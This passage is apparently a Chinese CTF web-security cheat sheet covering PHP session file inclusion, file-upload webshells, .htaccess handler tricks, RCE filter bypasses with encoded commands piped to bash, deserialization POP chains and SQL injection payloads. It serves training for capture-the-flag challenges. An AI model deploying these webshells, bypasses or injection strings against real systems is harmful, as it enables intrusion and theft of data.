-<li><p><strong>session.upload_progress_name</strong>：当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控</p>
-</li>
-<li><p><strong>session.upload_progress_prefix</strong>：与session.upload_progress_name 将表示为 session 中的键名</p>
-</li>
-</ul>
-<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p><code>$_SESSION[&quot;username&quot;]=参数</code></p>
-<p>当Session文件的内容可控，并且可以获取Session文件的路径，就可以通过包含Session文件进行攻击。</p>
-<ul>
-<li>Session的存储位置获取：</li>
-</ul>
-<p>​	（1）通过phpinfo的信息可以获取到Session的存储位置。phpinfo中的<strong>session.save_path</strong>存储的是Session的存放位置。通过phpinfo的信息获取到session.save_path为<code>/var/lib/php/session</code>。</p>
-<p>​	（2）通过猜测默认的Session存放位置进行尝试。通常Linux下Session默认存储在<code>/var/lib/php/session</code>目录下。默认存储Session存放位置。</p>
-<h4 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h4><blockquote>
-<p>by <a target="_blank" rel="noopener" href="https://ph0ebus.github.io/post/[%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%202021]EasyCleanup">ph0ebus</a></p>
-</blockquote>
-<ul>
-<li><p>目标环境开启了<code>session.upload_progress.enable</code>选项</p>
-</li>
-<li><p>发送一个文件上传请求，其中包含一个文件表单和一个名字是PHP_SESSION_UPLOAD_PROGRESS的字段</p>
-</li>
-<li><p>请求的Cookie中包含Session ID</p>
-</li>
-<li><p>注意的是，如果我们只上传一个文件，这里也是不会遗留下Session文件的，所以表单里必须有两个以上的文件上传。</p>
-</li>
-</ul>
-<hr>
-<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ul>
-<li><p><strong>调整php.ini中的不合理配置</strong></p>
-<ul>
-<li><strong>magic_quotes_gpc&#x3D;On</strong>，将参数中的异常字符进行转义。</li>
-<li><strong>allow_url_include&#x3D;Off</strong>，禁止将URL作为文件打开处理。</li>
-<li><strong>allow_url_fopen&#x3D;Off</strong>，禁止<code>include()</code>和<code>require()</code>打开URL作为文件处理</li>
-</ul>
-</li>
-<li><p><strong>过滤异常字符</strong></p>
-<p>检查参数，如果参数中含有<code>%</code>，<code>#</code>，<code>;</code>等不需要的字符，将其去掉或者拒绝请求</p>
-</li>
-<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wuyt2008/article/details/8282310"><strong>更改Apache日志路径</strong></a></p>
-</li>
-<li><p><strong>写死包含的路径或文件名</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    header(&quot;Content-type:text/html;charset=utf-8&quot;);</span><br><span class="line">    error_reporting(E_ERROR); </span><br><span class="line">    ini_set(&quot;display_errors&quot;,&quot;Off&quot;);</span><br><span class="line">    $link=$_GET[&#x27;jumpTo&#x27;];</span><br><span class="line">    if (isset($link)) &#123;</span><br><span class="line">        switch ($link) &#123;</span><br><span class="line">            case &#x27;job&#x27;:</span><br><span class="line">                include(&#x27;./jobs.php&#x27;);</span><br><span class="line">                break;</span><br><span class="line">            case &#x27;hobby&#x27;:</span><br><span class="line">                include(&#x27;./hobby.php&#x27;);</span><br><span class="line">                break;</span><br><span class="line">            default:</span><br><span class="line">                die(&quot;风雪的缩影，如琉璃般飘落......&quot;);</span><br><span class="line">                break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">    	// Do nothing.    </span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;王小美の主页&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1 style=&quot;text-align: center;&quot;&gt;个人主页&lt;/h1&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;img src=&quot;./img/ganyu.png&quot;&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;p&gt;Name: 甘雨&lt;/p&gt;&lt;br&gt;</span><br><span class="line">    &lt;p&gt;Age: 3000+&lt;/p&gt;&lt;br&gt;</span><br><span class="line">    &lt;p&gt;我是女生&lt;/p&gt;&lt;br&gt;</span><br><span class="line">    &lt;a href=&quot;./index.php?jumpTo=job&quot;&gt;我的工作&lt;/a&gt;&amp;nbsp;&amp;nbsp;&lt;a href=&quot;./index.php?jumpTo=hobby&quot;&gt;我的兴趣爱好&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
-</ul>
-<hr>
-<h2 id="文件上传upload"><a href="#文件上传upload" class="headerlink" title="文件上传upload"></a>文件上传upload</h2><ul>
-<li><p>php写一句话木马上传</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>PHP环境下若php被过滤且无提示，传入**.phtml&#x2F;.php3&#x2F;.php4**的一句话木马（可当作php解析）</li>
-<li>要求传图片，可写入一句话木马改成图片格式，上传时改成.php</li>
-<li>php过滤可尝试改成Php</li>
-</ul>
-</li>
-<li><p>php写&lt;?php phpinfo();?&gt;直接上传</p>
-</li>
-<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mmzkyl/article/details/112138834">.htaccess</a>(环境为Apache时使用)</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;1.jpg&quot;&gt;</span><br><span class="line"></span><br><span class="line">Sethandler application/x-httpd-php</span><br><span class="line">#&lt;!-- 将匹配到的 1.jpg 文件按照php解析执行 --&gt;</span><br><span class="line"></span><br><span class="line">Addhandler php5-script .jpg</span><br><span class="line">#&lt;!-- 将匹配到的 1.jpg 文件按照php解析执行 --&gt;</span><br><span class="line"></span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">#&lt;!-- 该种匹配方式较为精准，不会造成大批的误伤情况 --&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>记得改Content-Type</li>
-</ul>
-</li>
-</ul>
-<hr>
-<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="Linux指令"><a href="#Linux指令" class="headerlink" title="Linux指令"></a>Linux指令</h3><p>whoami：返回系统当前用户名<br>cat filename：读取文件内容<br>tac&#x2F;head&#x2F;tail&#x2F;more&#x2F;less&#x2F;nl……：等同于cat</p>
-<p>tee:读取标准输入的数据，并将其内容输出成文件</p>
-<p>​	<code>command | tee file.txt</code></p>
-<h3 id="系统命令执行函数"><a href="#系统命令执行函数" class="headerlink" title="系统命令执行函数"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45927819/article/details/109671655?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167003773216782428635305%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167003773216782428635305&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-109671655-null-null.142%5Ev67%5Epc_rank_34_queryrelevant25,201%5Ev3%5Econtrol,213%5Ev2%5Et3_esquery_v2&utm_term=ctf%20%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8Dls%E8%A2%AB%E8%BF%87%E6%BB%A4&spm=1018.2226.3001.4187">系统命令执行函数</a></h3><ul>
-<li>system：有回显</li>
-<li>exec：无回显</li>
-<li>shell_exec：</li>
-<li>passthru：</li>
-<li>反引号`：命令执行，内联执行，`ls`输出查询结果的内容</li>
-<li>&amp;：按位与</li>
-<li>&amp;&amp;：逻辑与</li>
-<li>|：按位或，直接执行下一条语句</li>
-<li>||：逻辑或</li>
-<li>;：在 shell 中，是”连续指令”，执行下一条语句</li>
-<li>scandir(‘&#x2F;‘)：列出指定路径中的文件和目录</li>
-<li>file_get_contents(‘&#x2F;flag’)：读取文件</li>
-<li>find：查找与指定参数条件匹配的文件及目录列表<ul>
-<li>-name：按文件名称查找</li>
-</ul>
-</li>
-</ul>
-<h3 id="绕过被过滤的字符"><a href="#绕过被过滤的字符" class="headerlink" title="绕过被过滤的字符"></a>绕过被过滤的字符</h3><p><strong>下划线</strong>：“+”或“[”或“ ”或“.”</p>
-<p><strong>空格</strong>：$IFS$9 、${IFS} 、%09(php环境下)、重定向符&lt;&gt;、&gt;</p>
-<p><strong>分号</strong>：%0a</p>
-<p><strong>关键词</strong>：</p>
-<ul>
-<li><p><code>当ls被过滤时： a=l;b=s;$a$b 当cat flag被过滤时： a=c;b=at;c=f;d=lag;$a$b $&#123;c&#125;$&#123;d&#125; \#cat test文件内容 a=“ccaatt”;b=$&#123;a:0:1&#125;$&#123;a:2:1&#125;$&#123;a:4:1&#125;;$b test</code></p>
-</li>
-<li><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><h3 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h3><p><code>echo Y2F0IC9mbGFn|base64 -d|bash ==&gt;cat /flag echo Y2F0IC9mbGFn|base64 -d|sh==&gt;cat /flag echo Y2F0IGZsYWcucGhw|base64 -d|bash==&gt;cat flag.php echo Y2F0IGZsYWcucGhw|base64 -d|sh==&gt;cat flag.php</code></p>
-<h3 id="hex"><a href="#hex" class="headerlink" title="hex"></a>hex</h3><p><code>echo &quot;0x636174202f666c6167&quot; | xxd -r -p|bash ==&gt;cat /flag</code></p>
-<h3 id="oct-x2F-字节"><a href="#oct-x2F-字节" class="headerlink" title="oct&#x2F;字节"></a>oct&#x2F;字节</h3><p><code>$(printf &quot;\154\163&quot;) ==&gt;ls $(printf &quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;) ==&gt;cat /flag &#123;printf,&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;&#125;|\$0 ==&gt;cat /flag</code></p>
-<h3 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h3><p>内容为</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line">$&#123;printf,<span class="string">&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;</span>&#125; &gt;&gt; <span class="number">1</span>.php</span><br></pre></td></tr></table></figure>
-
-
-</li>
-<li><h3 id="单引号双引号绕过"><a href="#单引号双引号绕过" class="headerlink" title="单引号双引号绕过"></a>单引号双引号绕过</h3><p><code>c&#39;a&#39;t test</code></p>
-<p><code>  c&quot;a&quot;t test</code></p>
-</li>
-<li><h3 id="反斜杠绕过"><a href="#反斜杠绕过" class="headerlink" title="反斜杠绕过"></a>反斜杠绕过</h3><p><code>ca\t flag</code></p>
-</li>
-</ul>
-<h3 id="无字母rce"><a href="#无字母rce" class="headerlink" title="无字母rce"></a>无字母rce</h3><blockquote>
-<p>原型：对以下代码的绕过</p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p><strong>$_++&#x3D;1</strong></p>
-<p><code>$_++</code>对<code>_</code>变量进行了自增操作,由于我们没有定义<code>_</code>的值,PHP会给<code>_</code>赋一个默认值NULL&#x3D;&#x3D;0,</p>
-<p>由此我们可以看出,我们可以在不使用任何数字的情况下,通过对未定义变量的自增操作来得到一个数字</p>
-<p>取反绕过（脚本）</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code1</span>=<span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$code2</span>=<span class="string">&quot;cat /f*&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;?wllm=(~&quot;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$code1</span>).<span class="string">&quot;)(~&quot;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$code2</span>).<span class="string">&quot;);&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
-
-<h3 id="无回显rce"><a href="#无回显rce" class="headerlink" title="无回显rce"></a>无回显rce</h3><p>1.利用dnslog带外</p>
-<p>2.写马</p>
-<p>3.反弹shell</p>
-<p>4.写文件然后访问文件</p>
-<hr>
-<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/LJH1999ZN/article/details/123338591">反序列化</a></h2><p>O(对象):(类的字符长度):(类名):(项数):{s&#x2F;i(字符串&#x2F;数字):(长度):(内容);}</p>
-<ul>
-<li><h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><ul>
-<li><p>__invoke():当尝试以调用函数的方式调用对象的时候，就会调用该方法</p>
-<ul>
-<li>eval:代码执行</li>
-</ul>
-</li>
-<li><p>__construst():具有构造函数的类在创建新对象的时候，回调此方法</p>
-</li>
-<li><p>__destruct():反序列化的时候，或者对象销毁的时候调用</p>
-</li>
-<li><p>__wakeup():反序列化的时候调用</p>
-<ul>
-<li>当序列化字符串中表示对象属性个数的值大于真实的属性个数会跳过_wakeup的执行（CVE-2016-7124）(版本：<strong>PHP5 &lt; 5.6.25</strong>  <strong>PHP7 &lt; 7.0.10</strong>)</li>
-</ul>
-</li>
-<li><p>__sleep():序列化的时候调用</p>
-</li>
-<li><p>__toString():把类当成字符串的时候调用</p>
-<ul>
-<li>一般在echo处生效</li>
-</ul>
-</li>
-<li><p>__set():在给不可访问的(protected或者private)或者不存在的属性赋值的时候，会被调用</p>
-</li>
-<li><p>__get():读取不可访问或者不存在的属性的时候，进行赋值</p>
-</li>
-<li><p>__call():在对象中调用一个不存在或不可访问的方法的时候，会被执行</p>
-</li>
-</ul>
-</li>
-<li><h3 id="POP链"><a href="#POP链" class="headerlink" title="POP链"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_62422842/article/details/123988229?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166876201416782428623647%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166876201416782428623647&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-123988229-null-null.142%5Ev65%5Eopensearch_v2,201%5Ev3%5Econtrol,213%5Ev2%5Et3_esquery_v2&utm_term=pop%E9%93%BE&spm=1018.2226.3001.4187">POP链</a></h3><ul>
-<li><p>public:公有的类成员可以在任何地方被访问</p>
-</li>
-<li><p>protected:受保护的类成员则可以被其自身以及其子类和父类访问</p>
-<p>.*.</p>
-</li>
-<li><p>private:私有的类成员则只能被其定义所在的类访问</p>
-<p>.类名.</p>
-<ul>
-<li>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上0的前缀。字符串长度也包括所加前缀的长度：即%00</li>
-</ul>
-</li>
-<li><p>入口： __destruct()或___wakeup()</p>
-</li>
-<li><p>出口：__invoke()</p>
-</li>
-<li><p>通过this-&gt;指针调用其他类构造pop链</p>
-</li>
-</ul>
-</li>
-</ul>
-<hr>
-<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/114325805">SQL注入</a></h2><p><a target="_blank" rel="noopener" href="http://sqlwiki.radare.cn/#/injectionTypes/errorBased">wiki</a></p>
-<h3 id="SQL语法"><a href="#SQL语法" class="headerlink" title="SQL语法"></a><a target="_blank" rel="noopener" href="https://www.runoob.com/sql/sql-tutorial.html">SQL语法</a></h3><ul>
-<li><p>从数据库中选取数据</p>
-<p><code>SELECT column_name,column_name FROM table_name;</code>或<br><code>SELECT FROM table_name;</code></p>
-<ul>
-<li><p><code>select distinct</code>语句可用于返回唯一不同的值</p>
-</li>
-<li><p><code>SELECT FROM语句 + where column_name = value;</code>可用于提取满足指定条件的记录</p>
-</li>
-<li><p><code>SELECT FROM语句 + order by column_name(可多列查询 + ,column_name) ASC（升序）|DESC（降序）; </code>对结果集按照一个列或者多个列进行排序</p>
-<p>1‘ order by + 字段数# 用于查询可显示的字段</p>
-</li>
-<li><p><code>SELECT column_name(s) FROM table1 UNION SELECT column_name(s) FROM table2;</code>合并两个或多个 SELECT 语句的结果</p>
-<p>union select</p>
-</li>
-</ul>
-</li>
-<li><p><code>group_concat([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排序字段] [Separator &#39;分隔符&#39;])</code>将相同的行组合起来</p>
-</li>
-<li><p><strong>表示注释</strong>:</p>
-<p>#或%23：post请求中使用</p>
-<p>–+或–%20:get请求中使用（+将被识别为空格）</p>
-</li>
-<li><p><strong>关键字</strong></p>
-<p>database():数据库</p>
-<p>table_name:表名(表名为数字时：要用反引号包起来查询)</p>
-<p>column_name:列名</p>
-<hr>
-</li>
-</ul>
-<h3 id="万能密码绕过"><a href="#万能密码绕过" class="headerlink" title="万能密码绕过"></a>万能密码绕过</h3><ul>
-<li>原理：使相关语句永真</li>
-</ul>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;1&#x27;</span><span class="keyword">or</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1</span>#</span><br></pre></td></tr></table></figure>
-
-<p><code>ffifdyop</code>：md5加密时使用</p>
-<h3 id="位数长度不足"><a href="#位数长度不足" class="headerlink" title="位数长度不足"></a>位数长度不足</h3><p>使用截断函数</p>
-<ul>
-<li><strong>substr()函数</strong></li>
-</ul>
-<p>​	  <code>substr(string,start,length)</code><img src="C:\Users\Asus\AppData\Roaming\Typora\typora-user-images\image-20221207161642898.png" alt="	"></p>
-<ul>
-<li><p><strong>left()函数</strong></p>
-<p>获得源字符串左边的子串</p>
-<p><code>left(string,n)</code></p>
-</li>
-<li><p><strong>right()函数</strong></p>
-<p>获得字符串右边的子串</p>
-<p><code>right(string,n)</code></p>
-</li>
-<li><p><strong>mid()函数</strong></p>
-<p>返回字符串的子串</p>
-<p><code>mid(string,start,length)</code></p>
-</li>
-<li><p><strong>reverse()函数</strong></p>
-</li>
-</ul>
-<hr>
-<h3 id="过滤替换"><a href="#过滤替换" class="headerlink" title="过滤替换"></a>过滤替换</h3><ul>
-<li><p>空格：&#x2F;**&#x2F;</p>
-</li>
-<li><p>等号：like</p>
-</li>
-<li><p>select…where…：</p>
-<ul>
-<li><p>show + datebases &#x2F; tables &#x2F; columns from table </p>
-</li>
-<li><p>将 select * from 列名 进行16进制编码</p>
-</li>
-<li><p><strong>handler</strong>:一行一行显示库中内容</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">handler tablename <span class="keyword">open</span> <span class="keyword">as</span> `a`;(`a`为新创建的表)</span><br><span class="line">handler tablename read;读出什么输出什么</span><br><span class="line"></span><br><span class="line">handler tablename read <span class="keyword">first</span> [<span class="keyword">where</span> username<span class="operator">=</span>‘admin’];</span><br><span class="line">handler `a` read next [<span class="keyword">where</span> username<span class="operator">=</span>‘admin’]; – [] 中的内容意味着可加可不加</span><br></pre></td></tr></table></figure></li>
-</ul>
-</li>
-</ul>
-<hr>
-<h3 id="注入位置"><a href="#注入位置" class="headerlink" title="注入位置"></a>注入位置</h3><h3 id="注入手法"><a href="#注入手法" class="headerlink" title="注入手法"></a>注入手法</h3><ul>
-<li><p>数字型：当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入（无引号闭合）</p>
-</li>
-<li><p>字符型：当输入的参数被当做字符串时，称为字符型（有引号闭合）</p>
-<hr>
-</li>
-</ul>
-<h3 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><ul>
-<li><p>适用于有显示位的注入，即页面某个位置会根据我们输入的数据的变化而变化</p>
-</li>
-<li><p>步骤</p>
-<p><em>1. 页面观察</em></p>
-<p><em>2. 注入点判断</em></p>
-<p><em>3. 判断当前表的字段个数</em>：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 3 --+</span></span><br></pre></td></tr></table></figure>
-
-<p><em>4. 判断显示位</em>：判断我们的输入会在屏幕哪个地方进行回显</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,3 --+</span></span><br><span class="line"><span class="string">//=-1&#x27;</span>:(让前面的参数查不出来)</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>:(总列数)</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span><span class="comment">--+(注释)</span></span><br></pre></td></tr></table></figure>
-
-<p><em>5. 爆数据库名字</em></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,database(),3 --+</span></span><br><span class="line"><span class="string">//1:(头列数)</span></span><br><span class="line"><span class="string">//3:(尾列数)</span></span><br></pre></td></tr></table></figure>
-
-<p><em>6. 爆数据库中的表</em></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()/&#x27;</span>数据库名<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure>
-
-<p><em>7. 爆表中的字段</em></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where (table_schema=&#x27;</span>数据库名<span class="string">&#x27; and)  table_name=&#x27;</span>表名<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure>
-
-<p><em>8. 爆相应字段的所有数据</em></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(字段名,&#x27;</span><span class="comment">--&#x27;,字段名,&#x27;--&#x27;,字段名),3 from 表名 --+</span></span><br></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><ul>
-<li><p><strong>group by 重复键冲</strong></p>
-<p><code>?id=-1&#39; and (select 1 from (select count(*),concat((select 查询的内容 from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) --+ </code></p>
-</li>
-<li><p><strong>extractvalue(目标xml文档，xml路径)函数</strong></p>
-<p>对XML文档进行查询的函数，从目标XML中返回包含所查询值的字符串</p>
-<p><code>?id=-1&#39; and extractvalue(1,concat(&#39;^&#39;,(select (不要加列数) database()),&#39;^&#39;)) --+</code></p>
-</li>
-<li><p><strong>updatexml() 函数</strong></p>
-<p>原理：updatexml()函数实际上是去更新了XML文档，但是我们在xml文档路径的位置里面写入了子查询，我们输入特殊字符，然后就			因为不符合输入规则然后报错了，但是报错的时候它其实已经执行了那个子查询代码</p>
-<p>作用: 改变文档中符合条件的节点的值</p>
-<p><code>?id=-1&#39; and updatexml(1,concat(&#39;^&#39;,(需要查询的内容),&#39;^&#39;),1) --+</code></p>
-</li>
-</ul>
-<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><ul>
-<li><p>使用<code>;</code>执行多条sql语句</p>
-</li>
-<li><p><strong>区别</strong>：联合查询注入只能执行查询语句，堆叠注入可执行任意语句</p>
-</li>
-<li><p><strong>rename…to…语句</strong>:可以重命名改表名，使表名可被直接查询到</p>
-</li>
-<li><p><strong>alter</strong>：修改已知表的列。（ 添加：add | 修改：alter，change | 撤销：drop ）</p>
-<ul>
-<li><p>添加：</p>
-<p><code>alter table &quot; table_name&quot; add &quot; column_name&quot;  type;</code></p>
-</li>
-<li><p>删除：</p>
-<p><code>alter table &quot; table_name&quot; drop &quot; column_name&quot;  type;</code></p>
-</li>
-<li><p>改变数据类型：</p>
-<p><code>alter table &quot; table_name&quot; alter column &quot; column_name&quot; type;</code></p>
-</li>
-<li><p>改列名：</p>
-<p><code>alter table &quot;table_name&quot; rename &quot;column1&quot; to &quot;column2&quot;;</code></p>
-</li>
-</ul>
-</li>
-<li><p><strong>编码</strong>(以select * from `1919810931114514`为例)</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">SeT</span><span class="variable">@a</span><span class="operator">=</span><span class="number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;<span class="keyword">prepare</span> execsql <span class="keyword">from</span> <span class="variable">@a</span>;<span class="keyword">execute</span> execsql;#</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>prepare…from…是预处理语句，会进行编码转换</li>
-<li>execute用来执行由SQLPrepare创建的SQL语句</li>
-<li>SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值</li>
-</ul>
-</li>
-</ul>
-<hr>
-<h2 id="SSTI（服务器端模板注入）"><a href="#SSTI（服务器端模板注入）" class="headerlink" title="SSTI（服务器端模板注入）"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/Manuffer/article/details/120739989?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167059854216800213073654%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167059854216800213073654&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-120739989-null-null.142%5Ev68%5Epc_new_rank,201%5Ev4%5Eadd_ask,213%5Ev2%5Et3_esquery_v2&utm_term=SSTI&spm=1018.2226.3001.4187">SSTI（服务器端模板注入）</a></h2><ul>
-<li><p>原理：</p>
-<p>render_template渲染函数的问题</p>
-<p>渲染函数在渲染的时候，往往对用户输入的变量不做渲染。</p>
-</li>
-</ul>
